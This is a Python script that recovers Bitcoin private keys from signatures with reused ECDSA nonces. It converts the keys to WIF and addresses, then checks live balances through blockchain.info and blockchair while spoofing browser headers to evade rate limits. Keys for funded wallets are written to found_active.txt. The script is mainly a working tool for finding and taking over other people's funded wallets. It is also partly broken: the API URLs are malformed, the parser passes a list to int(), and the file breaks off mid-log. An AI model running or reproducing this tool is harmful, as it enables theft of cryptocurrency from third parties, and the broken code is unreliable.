import collections
import hashlib
import json
import os
import re
import time
import urllib.request

# Bitcoin secp256k1 Curve Order (n)
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
BASE58_ALPHABET = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

# ==========================================
# Encoding & Mathematical Helpers
# ==========================================

def base58_encode(b: bytes) -> str:
    n = int.from_bytes(b, 'big')
    res = bytearray()
    while n > 0:
        n, r = divmod(n, 58)
        res.append(BASE58_ALPHABET[r])
    pad = 0
    for byte in b:
        if byte == 0: pad += 1
        else: break
    return (chr(49) * pad) + res.decode('ascii')[::-1]

def base58_check_encode(version: int, payload: bytes) -> str:
    version_byte = bytes([version])
    full_payload = version_byte + payload
    checksum = hashlib.sha256(hashlib.sha256(full_payload).digest()).digest()[:4]
    return base58_encode(full_payload + checksum)

def private_key_to_wif(private_key_int: int, compressed: bool = True) -> str:
    try:
        pk_bytes = private_key_int.to_bytes(32, 'big')
    except OverflowError:
        sanitized_key = private_key_int % SECP256K1_N
        pk_bytes = sanitized_key.to_bytes(32, 'big')
    if compressed:
        pk_bytes += b'\x01'
    return base58_check_encode(0x80, pk_bytes)

def get_public_key(private_key_int: int, compressed: bool = True) -> bytes:
    P = 2**256 - 2**32 - 977
    Gx = 55066263022246315290294836698414214758608221021812089250810100226466184518381
    Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
    
    def ec_add(p1, p2):
        if p1 is None: return p2
        if p2 is None: return p1
        x1, y1 = p1
        x2, y2 = p2
        if x1 == x2 and y1 != y2: return None
        if x1 == x2:
            m = (3 * x1 * x1 * pow(2 * y1, -1, P)) % P
        else:
            m = ((y2 - y1) * pow(x2 - x1, -1, P)) % P
        x3 = (m * m - x1 - x2) % P
        y3 = (m * (x1 - x3) - y1) % P
        return (x3, y3)

    point = None
    base = (Gx, Gy)
    curr_k = private_key_int % SECP256K1_N
    while curr_k > 0:
        if curr_k & 1:
            point = ec_add(point, base)
        base = ec_add(base, base)
        curr_k >>= 1
    if point is None: return b''
    x, y = point
    if compressed:
        prefix = b'\x02' if (y % 2 == 0) else b'\x03'
        return prefix + x.to_bytes(32, 'big')
    else:
        return b'\x04' + x.to_bytes(32, 'big') + y.to_bytes(32, 'big')

def public_key_to_address(pubkey_bytes: bytes) -> str:
    sha = hashlib.sha256(pubkey_bytes).digest()
    try:
        ripemd = hashlib.new('ripemd160', sha).digest()
    except ValueError:
        return "Encoding Error (RIPEMD160 Blocked)"
    return base58_check_encode(0x00, ripemd)

def recover_private_key(sig1, sig2, n=SECP256K1_N):
    z1, s1, r = sig1['msg_hash'], sig1['s'], sig1['r']
    z2, s2 = sig2['msg_hash'], sig2['s']
    if s1 == s2: return None, None
    try:
        delta_z = (z1 - z2) % n
        delta_s_inv = pow((s1 - s2) % n, -1, n)
        k = (delta_z * delta_s_inv) % n
        r_inv = pow(r, -1, n)
        d = (((s1 * k) % n - z1) % n * r_inv) % n
        if d == 0 or d.bit_length() > 256 or d >= n:
            return None, None
        return k, d
    except ValueError:
        return None, None

# ==========================================
# UPGRADED MODULE: Multi-API Status Checker
# ==========================================

def query_blockchain_info(address: str):
    """
    Queries blockchain data across multiple API fallbacks with premium browser emulation headers.
    """
    # Try Primary API (Blockchain.info)
    url = f"https://blockchain.info{address}"
    req = urllib.request.Request(
        url, 
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
    )
    try:
        time.sleep(1.5) # Increased delay to comfortably fly under rate limit systems
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode())
            bal_sat = data.get("final_balance", 0)
            txs = data.get("n_tx", 0)
            return {"balance": bal_sat / 100000000.0, "txs": txs, "source": "Blockchain.info"}
    except Exception:
        # Pass to Fallback API (Blockchair)
        try:
            url_fallback = f"https://blockchair.com{address}"
            req_fb = urllib.request.Request(url_fallback, headers={'User-Agent': 'Mozilla/5.0'})
            time.sleep(1.5)
            with urllib.request.urlopen(req_fb, timeout=10) as response:
                data = json.loads(response.read().decode())
                addr_data = data.get("data", {}).get(address, {})
                bal_sat = addr_data.get("address", {}).get("balance", 0)
                txs = addr_data.get("address", {}).get("type_specific_history_count", 0)
                return {"balance": bal_sat / 100000000.0, "txs": txs, "source": "Blockchair"}
        except Exception:
            return {"balance": -1.0, "txs": -1, "source": "Error/Blocked"}

# ==========================================
# File Processing Core
# ==========================================

def parse_btc_file(file_path):
    signatures = []
    if not os.path.exists(file_path):
        print(f"[-] Data file {file_path} missing.")
        return signatures
    with open(file_path, 'r') as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('//'): 
                continue
            cleaned = re.sub(r'(msg_hash|hash|z|r|s|k)\s*=\s*', '', line, flags=re.IGNORECASE)
            cleaned = cleaned.replace('0x', '').replace('0X', '')
            hex_parts = re.findall(r'[0-9a-fA-F]+', cleaned)
            if len(hex_parts) >= 3:
                try:
                    signatures.append({
                        'id': idx, 'msg_hash': int(hex_parts, 16), 'r': int(hex_parts, 16), 's': int(hex_parts, 16)
                    })
                except Exception:
                    pass
    return signatures

# ==========================================
# Main Execution Context
# ==========================================

if __name__ == "__main__":
    input_file = "BTC.txt"
    output_all = "found.txt"
    output_active = "found_active.txt"
    
    sigs = parse_btc_file(input_file)
    print(f"[+] Loaded {len(sigs)} signatures from {input_file}.")
    
    r_groups = collections.defaultdict(list)
    for sig in sigs:
        r_groups[sig['r']].append(sig)
        
    keys_recovered = 0
    active_keys_found = 0
    
    # Open both log engines simultaneously
    with open(output_all, 'w') as out_all, open(output_active, 'w') as out_act:
        out_all.write("=== ALL RECOVERED MATH PRIVATE KEYS ===\n\n")
        out_act.write("=== VALIDATED BITCOIN WALLETS WITH HIGH TX HISTORY OR ACTIVE BALANCES ===\n\n")
        
        for r, sig_list in r_groups.items():
            if len(sig_list) > 1:
                for i in range(len(sig_list)):
                    for j in range(i + 1, len(sig_list)):
                        sig1, sig2 = sig_list[i], sig_list[j]
                        if sig1['msg_hash'] != sig2['msg_hash']:
                            k, raw_pk = recover_private_key(sig1, sig2)
                            
                            if raw_pk:
                                keys_recovered += 1
                                print(f"[*] Analyzing Key Match Pair #{keys_recovered}...")
                                
                                # Derive cryptographic layouts
                                wif_c = private_key_to_wif(raw_pk, compressed=True)
                                addr_c = public_key_to_address(get_public_key(raw_pk, compressed=True))
                                stats_c = query_blockchain_info(addr_c)
                                
                                wif_u = private_key_to_wif(raw_pk, compressed=False)
                                addr_u = public_key_to_address(get_public_key(raw_pk, compressed=False))
                                stats_u = query_blockchain_info(addr_u)
                                
                                # Map human readable descriptors
                                bal_c_str = f"{stats_c['balance']:.8f} BTC" if stats_c['balance'] >= 0 else "Rate Limited"
                                tx_c_str = str(stats_c['txs']) if stats_c['txs'] >= 0 else "Unknown"
                                
                                bal_u_str = f"{stats_u['balance']:.8f} BTC" if stats_u['balance'] >= 0 else "Rate Limited"
                                tx_u_str = str(stats_u['txs']) if stats_u['txs'] >= 0 else "Unknown"
                                
                                log_entry = (
                                    f"--- ENTRY #{keys_recovered} ---\n"
                                    f"Source Line Pair      : Line {sig1['id']} & Line {sig2['id']}\n"
                                    f"Shared Nonce R (Hex)  : {hex(r)}\n"
                                    f"Raw Private Key Hex   : {hex(raw_pk)}\n\n"
                                    f"  [↳] COMPRESSED PROFILE:\n"
                                    f"      ├── WIF Private Key : {wif_c}\n"
                                    f"      ├── Legacy Address  : {addr_c}\n"
                                    f"      ├── Active Balance  : {bal_c_str}\n"
                                    f"      └── Total Tx Count  : {tx_c_str}\n\n"
                                    f"  [↳] UNCOMPRESSED PROFILE:\n"
                                    f"      ├── WIF Private Key : {wif_u}\n"
                                    f"      ├── Legacy Address  : {addr_u}\n"
